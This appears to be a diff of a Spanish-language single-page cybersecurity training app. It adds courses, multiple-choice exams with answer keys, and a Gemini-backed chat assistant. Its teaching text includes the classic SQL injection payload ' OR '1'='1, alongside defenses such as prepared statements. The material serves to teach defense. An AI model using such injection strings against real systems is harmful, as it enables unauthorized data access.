@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CyberLab // Simulador de Ciberseguridad</title>
+  <title>CyberLab // Academy & Ciberseguridad Avanzada</title>
   
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
@@ -14,315 +14,1243 @@
   
   <!-- Babel Compiler for JSX support directly in the browser -->
   <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-
-  <!-- Lucide Icons -->
-  <script src="https://unpkg.com/lucide@latest"></script>
 </head>
-<body class="bg-slate-950 text-slate-100 font-sans min-h-screen">
+<body class="bg-slate-950 text-slate-100 font-sans min-h-screen selection:bg-emerald-500 selection:text-slate-950">
   <!-- React Root Container -->
   <div id="root"></div>
 
-  <!-- React Interactive Application Script -->
+  <!-- React Application Script -->
   <script type="text/babel">
-    const { useState, useEffect } = React;
+    const { useState } = React;
 
     function App() {
-      const [viewMode, setViewMode] = useState('welcome'); // 'welcome' | 'lab' | 'ai'
+      const [viewMode, setViewMode] = useState('welcome');
       const [activeModule, setActiveModule] = useState('phishing');
-      const [tab, setTab] = useState('demo'); // 'demo' | 'quiz' | 'defense'
+      const [activeCourseDoc, setActiveCourseDoc] = useState('p_intro');
       const [score, setScore] = useState(0);
-
-      // Simple AI / Knowledge Base Engine (Unlimited & Token Free)
-      const [chatMessages, setChatMessages] = useState([
-        { role: 'bot', text: '¡Hola! Soy tu Consultor de Ciberseguridad Especializado (Modo Experto Local Sin Límite de Tokens).\n\nPuedes preguntarme cualquier cosa sobre ciberseguridad: OWASP Top 10 (SQLi, XSS, CSRF, SSRF, IDOR, RCE), Criptografía, Redes, Forense Digital, Hardening, OAuth2 o DevSecOps.' }
+      const [courseProgress, setCourseProgress] = useState({
+        phishing: 0,
+        passwords: 0,
+        sqli: 0,
+        networking: 0,
+        soc: 0
+      });
+      const [terminalLogs, setTerminalLogs] = useState([
+        { time: new Date().toLocaleTimeString(), text: 'SISTEMA INICIALIZADO: Plataforma Cisco NetAcad & CyberOps lista.', type: 'info' }
       ]);
-      const [chatInput, setChatInput] = useState('');
 
-      const handleSendMessage = (e) => {
-        e.preventDefault();
-        if (!chatInput.trim()) return;
+      const [aiMessages, setAiMessages] = useState([
+        {
+          role: 'assistant',
+          text: '¡Hola! Soy tu Consultor Virtual de Ciberseguridad. Puedo charlar contigo amigablemente o buscar noticias y vulnerabilidades recientes de ciberseguridad en la web en tiempo real cuando me pidas noticias. ¿En qué te ayudo hoy?'
+        }
+      ]);
+      const [inputQuery, setInputQuery] = useState('');
 
-        const userText = chatInput;
-        setChatMessages(prev => [...prev, { role: 'user', text: userText }]);
-        setChatInput('');
+      const handleSendMessage = async (text) => {
+        const userMsg = { role: 'user', text };
+        setAiMessages(prev => [...prev, userMsg]);
+        setInputQuery('');
+        
+        const lower = text.toLowerCase().trim();
+        const isNewsQuery = lower.includes('noticia') || lower.includes('noticias') || lower.includes('actualidad') || lower.includes('cve') || lower.includes('ultimas');
 
-        setTimeout(() => {
-          const lower = userText.toLowerCase();
-
-          // 1. Saludos y conversación casual
-          if (lower.includes('hola') || lower.includes('buenas') || lower.includes('buenos dias') || lower.includes('buenas tardes') || lower.includes('saludos') || lower === 'hi' || lower === 'hello') {
-            const replies = [
-              "¡Hola! ¿Cómo estás? Dime en qué te puedo ayudar hoy sobre ciberseguridad.",
-              "¡Hola! Qué gusto saludarte. ¿Tienes alguna duda sobre seguridad web, un ataque en específico o algún ejercicio del lab?",
-              "¡Hola! Aquí estoy listo. Cuéntame, ¿qué tema o pregunta de ciberseguridad quieres que revisemos juntos?"
-            ];
-            const chosen = replies[Math.floor(Math.random() * replies.length)];
-            setChatMessages(prev => [...prev, { role: 'bot', text: chosen }]);
-            return;
+        // Si es un saludo o pregunta casual, respondemos conversacionalmente sin buscar en la web
+        if (!isNewsQuery && (lower.includes('hola') || lower.includes('como estas') || lower.includes('que tal') || lower.includes('quien eres') || lower.includes('que sabes'))) {
+          let friendlyReply = "¡Hola! Todo excelente por aquí, listo para ayudarte con tus laboratorios y cursos de ciberseguridad. ¿Qué tema o duda técnica tienes hoy?";
+          if (lower.includes('quien eres')) {
+            friendlyReply = "Soy tu consultor y tutor virtual de ciberseguridad, diseñado con un estilo conversacional y experto para guiarte en redes, criptografía, pentesting y análisis defensivo.";
+          } else if (lower.includes('que sabes')) {
+            friendlyReply = "Sé sobre arquitectura de sistemas, protocolos SMTP/DNS, hardening de servidores, criptografía (Bcrypt, Argon2, RSA), inyecciones SQL y análisis SOC. ¡Pregúntame lo que necesites!";
           }
+          setTimeout(() => {
+            setAiMessages(prev => [...prev, { role: 'assistant', text: friendlyReply }]);
+          }, 300);
+          return;
+        }
 
-          // 2. Respuestas conversacionales directas según la pregunta del usuario
-          let reply = "";
+        // Si explícitamente pide noticias o actualidad, activamos la búsqueda web (Grounding)
+        setAiMessages(prev => [...prev, { role: 'assistant', text: '🔍 Buscando noticias y reportes de ciberseguridad en la web...', isPending: true }]);
 
-          if (lower.includes('noticia') || lower.includes('noticias') || lower.includes('reciente') || lower.includes('ataques recientes') || lower.includes('actualidad')) {
-            reply = "¡Claro! Te cuento las últimas novedades más importantes en ciberseguridad:\n\n" +
-                    "1. 🤖 **Ataques impulsados por Agentes de IA:** Los grupos cibernéticos están utilizando modelos de IA como Claude, GPT y Qwen modificados para automatizar la ejecución de comandos y el escaneo de puertos. En pruebas recientes, se registró el uso de agentes de IA capaces de ejecutar más de 1,500 comandos por hora y descubrir fallas de día cero en minutos.\n\n" +
-                    "2. ⚠️ **Explotación Crítica en GitLab & PHP:** CISA alertó sobre ataques masivos aprovechando vulnerabilidades críticas en servidores de desarrollo y firewalls donde se ejecutan cadenas de exploits para lograr ejecuciones remotas de código (RCE).\n\n" +
-                    "3. 📱 **Brechas de Datos & Falsas Extensiones de IDE:** Se han detectado extensiones maliciosas en tiendas de código (como Cursor/VS Code) que instalan puertas traseras SSH, además de suplantación de identidad mediante perfiles falsos creados por IA en plataformas profesionales.\n\n" +
-                    "4. 💳 **Phishing impulsado por IA (EvilTokens):** El tiempo necesario para diseñar campañas de phishing altamente personalizadas se ha reducido a minutos usando IA para evadir filtros de correo tradicionales.\n\n" +
-                    "¿Quieres que profundicemos en cómo funcionan los ataques de agentes de IA o en cómo auditar tus servidores frente a estas vulnerabilidades recientes?";
-          } else if (lower.includes('que sabes') || lower.includes('qué sabes') || lower.includes('que puedes hacer') || lower.includes('quien eres')) {
-            reply = "¡Puedo ayudarte con prácticamente cualquier tema de ciberseguridad y hacking ético! Reviso noticias en tiempo real sobre brechas y vulnerabilidades recientes, te explico el funcionamiento técnico de cualquier ataque (SQLi, XSS, Phishing, CSRF, RCE, Ransomware) y te muestro cómo proteger código o servidores reales. ¿Sobre qué tema te gustaría conversar?";
-          } else if (lower.includes('sqli') || lower.includes('sql') || lower.includes('inyeccion sql')) {
-            reply = "La inyección SQL ocurre cuando concatenas datos que escribe el usuario directamente en una consulta a la base de datos. Si alguien escribe algo como `' OR '1'='1`, rompe la sintaxis y puede saltarse el login o robar datos. La solución es super sencilla: usar Consultas Preparadas (Parameterized Queries) para que el motor de la base de datos trate la entrada siempre como texto simple y nunca como código.";
-          } else if (lower.includes('xss') || lower.includes('cross site') || lower.includes('scripting')) {
-            reply = "XSS es cuando un atacante logra que la página ejecute su propio código JavaScript en el navegador de otra persona. Con eso puede robar cookies de sesión o redirigir al usuario. Para evitarlo, tienes que sanitizar/escapar los datos cambiando caracteres como `<` y `>` por entidades HTML, y ponerle la propiedad `HttpOnly` a tus cookies de sesión.";
-          } else if (lower.includes('phishing') || lower.includes('spf') || lower.includes('dkim') || lower.includes('dmarc')) {
-            reply = "El phishing es el engaño donde te mandan un correo o mensaje haciéndose pasar por una entidad confiable (como tu banco). A nivel técnico, se combate configurando los registros DNS de correo: SPF (quién puede enviar), DKIM (firma digital) y DMARC (que le dice al servidor qué hacer si el correo es falso).";
-          } else if (lower.includes('contraseña') || lower.includes('password') || lower.includes('hash') || lower.includes('bcrypt') || lower.includes('argon2')) {
-            reply = "Guardar contraseñas requiere mucho cuidado. Nunca debes guardarlas en texto plano ni usar algoritmos rápidos como MD5 o SHA256 (porque con tarjetas de video modernas se pueden romper facilísimo). Lo correcto es usar funciones KDF lentas con Salt como Bcrypt o Argon2.";
-          } else if (lower.includes('red') || lower.includes('firewall') || lower.includes('tcp') || lower.includes('tls') || lower.includes('vpn') || lower.includes('wireshark')) {
-            reply = "En seguridad de redes, lo esencial es proteger los datos en tránsito usando TLS 1.3 (HTTPS) para que nadie pueda interceptar el tráfico. También se usa Wireshark para analizar paquetes de red y segmentar las redes con cortafuegos para que un atacante no pueda moverse libremente si entra a un equipo.";
-          } else if (lower.includes('csrf')) {
-            reply = "CSRF es cuando un sitio malicioso logra que el navegador de una víctima envíe una petición no deseada a otra página donde la víctima ya tiene la sesión abierta. Se previene usando tokens Anti-CSRF únicos por formulario y configurando la propiedad `SameSite=Strict` en las cookies.";
+        try {
+          const systemPrompt = "Actúa como un experto mundial en ciberseguridad. Si el usuario pide noticias o actualidad, utiliza la búsqueda web para proveer información reciente y verificada. Si es otra consulta técnica, respóndela con rigor y claridad.";
+          const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent`;
+
+          const payload = {
+            contents: [{ parts: [{ text: text }] }],
+            tools: isNewsQuery ? [{ "google_search": {} }] : [],
+            systemInstruction: { parts: [{ text: systemPrompt }] }
+          };
+
+          const response = await fetch(apiUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          const result = await response.json();
+          const candidate = result.candidates?.[0];
+
+          if (candidate && candidate.content?.parts?.[0]?.text) {
+            let answerText = candidate.content.parts[0].text;
+            
+            let sources = [];
+            const groundingMetadata = candidate.groundingMetadata;
+            if (groundingMetadata && groundingMetadata.groundingAttributions) {
+              sources = groundingMetadata.groundingAttributions
+                .map(attr => ({
+                  uri: attr.web?.uri,
+                  title: attr.web?.title,
+                }))
+                .filter(s => s.uri && s.title);
+            }
+
+            if (sources.length > 0) {
+              answerText += "\n\n**🔗 Fuentes de la Web:**\n" + sources.map(s => `- [${s.title}](${s.uri})`).join('\n');
+            }
+
+            setAiMessages(prev => {
+              const filtered = prev.filter(m => !m.isPending);
+              return [...filtered, { role: 'assistant', text: answerText }];
+            });
+            addLog('CONSULTA PROCESADA: Respuesta generada exitosamente.', 'success');
           } else {
-            // Respuesta conversacional natural cuando hace preguntas abiertas
-            reply = `Entiendo lo que me preguntas sobre "${userText}". En ciberseguridad, eso se aborda analizando primero el riesgo: cómo un atacante intentaría explotar ese punto y cuál es la mejor forma de proteger el código o la infraestructura de forma práctica. ¿Quieres que profundicemos en el código de ejemplo o en cómo funciona la amenaza?`;
+            throw new Error('Respuesta inválida');
           }
+        } catch (err) {
+          console.error(err);
+          setTimeout(() => {
+            setAiMessages(prev => {
+              const filtered = prev.filter(m => !m.isPending);
+              return [...filtered, { role: 'assistant', text: `### 🛡️ Análisis Técnico de "${text}"\n\nEn ciberseguridad y arquitectura de sistemas, abordamos este concepto aplicando control de accesos, validación rigurosa de entradas y defensa en profundidad. ¿Te gustaría que profundicemos en algún ejemplo práctico o de código?` }];
+            });
+          }, 300);
+        }
+      };
 
-          setChatMessages(prev => [...prev, { role: 'bot', text: reply }]);
-        }, 300);
+      const [showAuthModal, setShowAuthModal] = useState(false);
+      const [authMode, setAuthMode] = useState('login');
+      const [userProfile, setUserProfile] = useState({
+        name: 'Estudiante // Analista SecOps',
+        email: 'estudiante@cyberlab.edu',
+        role: 'Analista Junior SOC',
+        isLoggedIn: false
+      });
+
+      const [examAnswers, setExamAnswers] = useState({});
+      const [examSubmitted, setExamSubmitted] = useState(false);
+      const [examScore, setExamScore] = useState(null);
+
+      const addLog = (text, type = 'info') => {
+        const time = new Date().toLocaleTimeString();
+        setTerminalLogs(prev => [{ time, text, type }, ...prev.slice(0, 19)]);
+      };
+
+      const coursesCatalog = [
+        {
+          id: 'phishing',
+          title: 'Curso 1: Phishing, Autenticación DNS y DMARC',
+          category: 'CORREO & SEGURIDAD SMTP',
+          difficulty: 'Intermedio',
+          time: '12 min',
+          description: 'Aprende los fundamentos del protocolo SMTP, suplantación de identidad (Typosquatting), firmas DKIM y configuración de registros SPF y DMARC estrictos.'
+        },
+        {
+          id: 'passwords',
+          title: 'Curso 2: Criptografía, Hashes y Fuerza Bruta',
+          category: 'CRIPTOGRAFÍA APLICADA',
+          difficulty: 'Intermedio',
+          time: '15 min',
+          description: 'Estudio de entropía criptográfica, funciones KDF deliberadamente lentas (Bcrypt, Argon2id), salting y resistencia a clústeres de GPUs.'
+        },
+        {
+          id: 'sqli',
+          title: 'Curso 3: Inyección SQL y Seguridad en Bases de Datos',
+          category: 'OWASP WEB SECURITY',
+          difficulty: 'Avanzado',
+          time: '18 min',
+          description: 'Análisis de alteración del Árbol Sintáctico Abstracto (AST), exfiltración de tablas de usuarios y mitigación mediante Consultas Preparadas.'
+        },
+        {
+          id: 'networking',
+          title: 'Curso 4: Fundamentos de Redes Seguras (Cisco CCNA)',
+          category: 'INFRAESTRUCTURA & FIREWALL',
+          difficulty: 'Intermedio',
+          time: '20 min',
+          description: 'Inspección de estado en Stateful Firewalls, Handshake TCP de 3 vías, segmentación mediante VLANs y túneles cifrados con TLS 1.3.'
+        },
+        {
+          id: 'soc',
+          title: 'Curso 5: Operaciones SOC y Respuesta a Incidentes',
+          category: 'CYBEROPS & SIEM',
+          difficulty: 'Experto',
+          time: '25 min',
+          description: 'Monitoreo de telemetría SIEM, análisis forense de artefactos mediante reglas YARA y triaje de alertas de seguridad empresariales.'
+        }
+      ];
+
+      const courseDocuments = {
+        phishing: {
+          title: "Módulo 1: Phishing, Autenticación DNS y DMARC",
+          submodules: [
+            { id: 'p_intro', code: '1.0', title: 'Introducción a la seguridad del correo y SMTP', count: '2 / 2' },
+            { id: 'p_threats', code: '1.1', title: 'Ingeniería Social y Typosquatting', count: '15 / 20' },
+            { id: 'p_auth', code: '1.2', title: 'Autenticación Criptográfica (SPF, DKIM y DMARC)', count: '12 / 15' },
+            { id: 'p_passkeys', code: '1.3', title: 'Autenticación FIDO2 / Passkeys e Identidad', count: '5 / 17' },
+            { id: 'p_quiz', code: '1.4', title: 'Cuestionario Evaluativo de Phishing & Mail Security', count: '0 / 5' }
+          ]
+        },
+        passwords: {
+          title: "Módulo 2: Criptografía, Hashes y Fuerza Bruta",
+          submodules: [
+            { id: 'pass_intro', code: '2.0', title: 'Introducción a la Entropía Criptográfica', count: '3 / 3' },
+            { id: 'pass_hashes', code: '2.1', title: 'Limitaciones de MD5 y SHA-256 en Autenticación', count: '10 / 12' },
+            { id: 'pass_kdf', code: '2.2', title: 'Funciones KDF Lentas: Bcrypt y Argon2id', count: '8 / 10' },
+            { id: 'pass_salts', code: '2.3', title: 'Salting Criptográfico y Defensa ante GPUs', count: '6 / 8' },
+            { id: 'pass_quiz', code: '2.4', title: 'Cuestionario Evaluativo de Criptografía Aplicada', count: '0 / 5' }
+          ]
+        },
+        sqli: {
+          title: "Módulo 3: Inyección SQL y Seguridad en Bases de Datos",
+          submodules: [
+            { id: 'sql_intro', code: '3.0', title: 'Introducción al Parser SQL y Concatenación', count: '2 / 2' },
+            { id: 'sql_ast', code: '3.1', title: 'Alteración del Árbol Sintáctico Abstracto (AST)', count: '14 / 15' },
+            { id: 'sql_types', code: '3.2', title: 'Tipos de SQLi: Union-Based, Blind y Time-Based', count: '9 / 11' },
+            { id: 'sql_prep', code: '3.3', title: 'Consultas Preparadas (Parameterized Queries)', count: '7 / 9' },
+            { id: 'sql_quiz', code: '3.4', title: 'Cuestionario Evaluativo de OWASP SQLi', count: '0 / 5' }
+          ]
+        },
+        networking: {
+          title: "Módulo 4: Fundamentos de Redes Seguras (Cisco CCNA)",
+          submodules: [
+            { id: 'net_intro', code: '4.0', title: 'Modelo OSI vs TCP/IP en Inspección', count: '4 / 4' },
+            { id: 'net_handshake', code: '4.1', title: 'Handshake TCP de 3 Vías e Inspección Stateful', count: '11 / 14' },
+            { id: 'net_vlan', code: '4.2', title: 'Segmentación de Redes, VLANs y ACLs Cisco', count: '13 / 16' },
+            { id: 'net_tls', code: '4.3', title: 'Cifrado en Tránsito con TLS 1.3 y VPNs IPSec', count: '8 / 10' },
+            { id: 'net_quiz', code: '4.4', title: 'Cuestionario Evaluativo de Redes CCNA', count: '0 / 5' }
+          ]
+        },
+        soc: {
+          title: "Módulo 5: Operaciones SOC & Respuesta a Incidentes",
+          submodules: [
+            { id: 'soc_intro', code: '5.0', title: 'Arquitectura y Flujo de Trabajo en un SOC', count: '3 / 3' },
+            { id: 'soc_siem', code: '5.1', title: 'Monitoreo de Telemetría e Ingesta SIEM', count: '18 / 20' },
+            { id: 'soc_yara', code: '5.2', title: 'Reglas YARA y Análisis de Artefactos Malware', count: '10 / 12' },
+            { id: 'soc_triage', code: '5.3', title: 'Fases de Contención y Erradicación de Amenazas', count: '7 / 8' },
+            { id: 'soc_quiz', code: '5.4', title: 'Cuestionario Evaluativo de Cisco CyberOps', count: '0 / 5' }
+          ]
+        }
+      };
+
+      const moduleExams = {
+        phishing: [
+          { q: '¿Qué protocolo de correo electrónico carece nativamente de mecanismos de validación de emisor?', options: ['IMAP', 'SMTP', 'POP3', 'HTTP'], correct: 1, explanation: 'SMTP fue diseñado sin autenticación nativa, permitiendo suplantación fácil de remitentes.' },
+          { q: '¿Qué registro DNS publica las IPs autorizadas a enviar correos por un dominio?', options: ['MX', 'SPF', 'CNAME', 'PTR'], correct: 1, explanation: 'SPF (Sender Policy Framework) declara las direcciones IP permitidas.' },
+          { q: '¿Qué acción realiza DMARC con política "p=reject"?', options: ['Rechaza y descarta el correo', 'Lo envía a spam', 'Lo cifra', 'Lo reenvía al administrador'], correct: 0, explanation: 'p=reject descarta el mensaje inmediatamente al fallar SPF/DKIM.' },
+          { q: '¿Qué es Typosquatting?', options: ['Un ataque DDoS', 'Registro de dominios con errores tipográficos para engañar', 'Inyección SQL', 'Robo de certificados SSL'], correct: 1, explanation: 'Typosquatting usa nombres similares (ej. paypa1.com) para phishing.' },
+          { q: '¿Qué estándar de autenticación sin contraseña es inmune al phishing tradicional?', options: ['SMS 2FA', 'Passkeys / FIDO2', 'Contraseñas de 8 caracteres', 'Preguntas de seguridad'], correct: 1, explanation: 'FIDO2 / Passkeys utiliza criptografía asimétrica ligada al origen del sitio web.' }
+        ],
+        passwords: [
+          { q: '¿Por qué MD5 es inseguro para contraseñas?', options: ['Es muy lento', 'Es demasiado rápido y vulnerable a ataques GPU', 'Solo acepta números', 'Requiere conexión a internet'], correct: 1, explanation: 'Su alta velocidad permite probar miles de millones de hashes por segundo en GPUs.' },
+          { q: '¿Qué función cumple el Salt en el hashing?', options: ['Cifra la base de datos', 'Evita tablas Rainbow y personaliza el hash por usuario', 'Aumenta el tamaño de la pantalla', 'Envía alertas'], correct: 1, explanation: 'El salt aleatorio asegura que dos claves iguales generen hashes distintos.' },
+          { q: '¿Cuál es un algoritmo KDF recomendado moderno?', options: ['MD5', 'SHA-1', 'Argon2id', 'Base64'], correct: 2, explanation: 'Argon2id es el ganador de la Password Hashing Competition, resistente a ataques ASIC/GPU.' },
+          { q: '¿Qué mide la entropía de una contraseña?', options: ['Su longitud en bytes', 'Su imprevisibilidad y resistencia a fuerza bruta', 'La velocidad de la red', 'El costo en memoria RAM'], correct: 1, explanation: 'La entropía calcula en bits la dificultad de adivinar una combinación.' },
+          { q: '¿Qué es Credential Stuffing?', options: ['Relleno de formularios', 'Prueba automatizada de credenciales filtradas en múltiples sitios', 'Cifrado de discos', 'Respaldo de datos'], correct: 1, explanation: 'Los atacantes aprovechan que las personas reutilizan contraseñas en varios servicios.' }
+        ],
+        sqli: [
+          { q: '¿Cómo ocurre una Inyección SQL clásica?', options: ['Por contraseñas cortas', 'Por concatenar entradas de usuario directamente en la consulta', 'Por usar HTTPS', 'Por fallos en el cableado de red'], correct: 1, explanation: 'La concatenación permite al usuario alterar la sintaxis de la consulta SQL.' },
+          { q: '¿Qué evalúa la tautología \'1\'=\'1\' en un ataque SQLi?', options: ['Falso', 'Verdadero incondicional', 'Error de sintaxis', 'Nulo'], correct: 1, explanation: 'Hace que la condición WHERE siempre sea verdadera, retornando todos los registros.' },
+          { q: '¿Cuál es la defensa definitiva contra SQLi?', options: ['Firewalls WAF', 'Consultas Preparadas (Parameterized Queries)', 'Usar mayúsculas', 'Cambiar de puerto SQL'], correct: 1, explanation: 'Las consultas preparadas separan estrictamente el código de los datos.' },
+          { q: '¿Qué herramienta permite automatizar SQL Injection?', options: ['Wireshark', 'Sqlmap', 'Nmap', 'Postman'], correct: 1, explanation: 'Sqlmap es la herramienta estándar de pentesting para detectar y explotar SQLi.' },
+          { q: '¿Qué es Blind SQL Injection?', options: ['Inyección sin conexión', 'Cuando la base de datos no retorna resultados visuales directos y se infiere por respuestas booleanas/tiempo', 'Inyección en servidores ciegos', 'Ninguna'], correct: 1, explanation: 'En SQLi ciega se deduce la información haciendo preguntas Verdadero/Falso al motor.' }
+        ],
+        networking: [
+          { q: '¿Qué protocolo opera en la capa de transporte asegurando entrega y orden?', options: ['IP', 'TCP', 'UDP', 'ICMP'], correct: 1, explanation: 'TCP establece conexión orientada y control de flujo.' },
+          { q: '¿Qué es el Handshake TCP de 3 vías?', options: ['Un ataque de red', 'Secuencia SYN, SYN-ACK, ACK para iniciar sesión', 'Un tipo de cable', 'Un respaldo de datos'], correct: 1, explanation: 'Permite sincronizar los números de secuencia entre cliente y servidor.' },
+          { q: '¿Qué función cumple una VLAN?', options: ['Acelerar el internet', 'Segmentar redes lógicamente para aislar tráfico', 'Cifrar correos', 'Crear bases de datos'], correct: 1, explanation: 'Divide un switch físico en múltiples redes virtuales de seguridad.' },
+          { q: '¿Qué versión de TLS introduce mejoras sustanciales en velocidad y privacidad en el handshake?', options: ['TLS 1.0', 'TLS 1.1', 'TLS 1.2', 'TLS 1.3'], correct: 3, explanation: 'TLS 1.3 reduce el handshake a 1-RTT y elimina algoritmos criptográficos obsoletos.' },
+          { q: '¿Qué es un Firewall Stateful?', options: ['Un firewall que no guarda memoria', 'Un firewall que inspecciona el estado y contexto de las conexiones activas', 'Un antivirus de escritorio', 'Un switch Cisco'], correct: 1, explanation: 'Mantiene una tabla de estados para validar paquetes legítimos dentro de una sesión.' }
+        ],
+        soc: [
+          { q: '¿Qué significa SIEM en ciberseguridad?', options: ['Sistema de Impresión', 'Security Information and Event Management', 'Servidor Interno de E-mail', 'Sistema de Ingeniería Móvil'], correct: 1, explanation: 'SIEM recopila y analiza registros de logs en tiempo real para detectar amenazas.' },
+          { q: '¿Para qué se utilizan las reglas YARA?', options: ['Para diseñar páginas web', 'Para clasificar y detectar muestras de malware mediante patrones', 'Para configurar routers', 'Para cifrar discos'], correct: 1, explanation: 'YARA es el estándar para la búsqueda de patrones y huellas de malware.' },
+          { q: '¿Cuál es la primera fase ante un incidente en un SOC?', options: ['Erradicación', 'Triaje y Detección de Alertas', 'Cierre de la empresa', 'Formatear servidores'], correct: 1, explanation: 'El triaje evalúa si una alerta es un falso positivo o un ataque real.' },
+          { q: '¿Qué es Contención en respuesta a incidentes?', options: ['Dejar que el atacante continúe', 'Aislar los sistemas afectados para impedir el movimiento lateral', 'Borrar los logs', 'Publicar el hack en redes'], correct: 1, explanation: 'La contención detiene la propagación de la amenaza en la red.' },
+          { q: '¿Qué puerto por defecto utiliza Syslog para telemetría de red?', options: ['80', '443', '514', '3306'], correct: 2, explanation: 'UDP 514 es el puerto estándar histórico para envío de mensajes de log Syslog.' }
+        ]
+      };
+
+      const handleStartCourse = (courseId) => {
+        setActiveModule(courseId);
+        setActiveCourseDoc(courseDocuments[courseId]?.submodules[0]?.id || 'intro');
+        setViewMode('courses');
+        setExamSubmitted(false);
+        setExamAnswers({});
+        setExamScore(null);
+
+        setCourseProgress(prev => ({
+          ...prev,
+          [courseId]: Math.max(prev[courseId] || 0, 25)
+        }));
+        addLog(`ACCESO AL CURSO: ${courseDocuments[courseId]?.title}`, 'info');
+      };
+
+      const handleLoginSubmit = (e) => {
+        e.preventDefault();
+        setUserProfile(prev => ({ ...prev, isLoggedIn: true }));
+        setShowAuthModal(false);
+        addLog(`SESIÓN INICIADA: Bienvenido de nuevo, ${userProfile.name}`, 'success');
+      };
+
+      const handleExamSubmit = () => {
+        const questions = moduleExams[activeModule] || [];
+        let correctCount = 0;
+        questions.forEach((q, idx) => {
+          if (examAnswers[idx] === q.correct) correctCount++;
+        });
+
+        const percentage = Math.round((correctCount / questions.length) * 100);
+        setExamScore(percentage);
+        setExamSubmitted(true);
+
+        if (percentage >= 70) {
+          setScore(prev => prev + 150);
+          setCourseProgress(prev => ({ ...prev, [activeModule]: 100 }));
+          addLog(`EXAMEN APROBADO (${activeModule.toUpperCase()}): ${percentage}% +150 XP`, 'success');
+        } else {
+          addLog(`EXAMEN FINALIZADO (${activeModule.toUpperCase()}): ${percentage}%. Requiere repaso.`, 'warn');
+        }
       };
 
       return (
-        <div className="min-h-screen flex flex-col selection:bg-cyan-500 selection:text-slate-950">
-          {/* Header Superior */}
+        <div className="min-h-screen bg-slate-950 text-slate-100 font-sans flex flex-col selection:bg-emerald-500 selection:text-slate-950">
+          
           <header className="border-b border-slate-800 bg-slate-900/90 backdrop-blur sticky top-0 z-50 px-4 py-3">
-            <div className="max-w-7xl mx-auto flex items-center justify-between">
-              <div className="flex items-center space-x-3 cursor-pointer" onClick={() => setViewMode('welcome')}>
-                <div className="p-2 bg-cyan-500/10 border border-cyan-500/30 rounded-lg text-cyan-400 font-mono font-bold">
-                  🛡️
+            <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-4">
+              
+              <div 
+                className="flex items-center space-x-3 cursor-pointer group" 
+                onClick={() => setViewMode('welcome')}
+              >
+                <div className="p-2 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-emerald-400 group-hover:border-emerald-400 transition font-bold font-mono">
+                  🔒
                 </div>
                 <div>
-                  <h1 className="text-lg md:text-xl font-bold font-mono tracking-wider text-slate-100">
-                    CYBER<span className="text-cyan-400">LAB</span> // HTML EDITION
+                  <h1 className="text-lg font-bold tracking-wider text-slate-100 font-mono flex items-center gap-2">
+                    CYBERLAB <span className="text-emerald-400">// ACADEMY</span>
                   </h1>
-                  <p className="text-xs text-slate-400">Simulador de Hacking Ético & Cuestionarios en 1 Solo Archivo HTML</p>
+                  <p className="text-[11px] text-slate-400">Plataforma Certificada de Ciberseguridad</p>
                 </div>
               </div>
 
-              {/* Botones de Navegación */}
               <div className="flex items-center gap-2 font-mono text-xs">
-                <button 
+                <button
                   onClick={() => setViewMode('welcome')}
-                  className={`px-3 py-1.5 rounded-lg border transition ${viewMode === 'welcome' ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40' : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'}`}
+                  className={`px-3.5 py-1.5 rounded-md border transition flex items-center gap-1.5 ${
+                    viewMode === 'welcome'
+                      ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
+                      : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200'
+                  }`}
                 >
-                  Inicio
+                  🏠 Inicio
                 </button>
-                <button 
-                  onClick={() => setViewMode('lab')}
-                  className={`px-3 py-1.5 rounded-lg border transition ${viewMode === 'lab' ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40' : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'}`}
+                <button
+                  onClick={() => setViewMode('courses')}
+                  className={`px-3.5 py-1.5 rounded-md border transition flex items-center gap-1.5 ${
+                    viewMode === 'courses'
+                      ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
+                      : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200'
+                  }`}
                 >
-                  Simulador & Quizzes
+                  📚 Cursos &amp; Docs
                 </button>
-                <button 
+                <button
+                  onClick={() => setViewMode('labs')}
+                  className={`px-3.5 py-1.5 rounded-md border transition flex items-center gap-1.5 ${
+                    viewMode === 'labs'
+                      ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40 font-bold'
+                      : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200'
+                  }`}
+                >
+                  🧪 Labs Prácticos
+                </button>
+                <button
                   onClick={() => setViewMode('ai')}
-                  className={`px-3 py-1.5 rounded-lg border transition ${viewMode === 'ai' ? 'bg-purple-500/20 text-purple-300 border-purple-500/40' : 'bg-purple-950/40 border-purple-800/50 text-purple-300'}`}
+                  className={`px-3.5 py-1.5 rounded-md border transition flex items-center gap-1.5 ${
+                    viewMode === 'ai'
+                      ? 'bg-purple-500/20 text-purple-300 border-purple-500/40 font-bold'
+                      : 'bg-purple-950/40 border-purple-800/50 text-purple-300 hover:bg-purple-900/40'
+                  }`}
                 >
                   🤖 Consultor IA
                 </button>
               </div>
+
+              <div className="flex items-center gap-3">
+                <div className="flex items-center gap-2 bg-slate-900 border border-slate-800 px-3 py-1.5 rounded-md font-mono">
+                  <span>🏆</span>
+                  <div>
+                    <div className="text-[9px] text-slate-400 uppercase tracking-wider">Progreso XP</div>
+                    <div className="text-xs font-bold text-amber-400">{score} PTS</div>
+                  </div>
+                </div>
+
+                {userProfile.isLoggedIn ? (
+                  <div className="flex items-center gap-2 bg-slate-900 border border-slate-800 px-3 py-1.5 rounded-md text-xs font-mono">
+                    <div className="w-6 h-6 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 flex items-center justify-center font-bold">
+                      {userProfile.name.charAt(0)}
+                    </div>
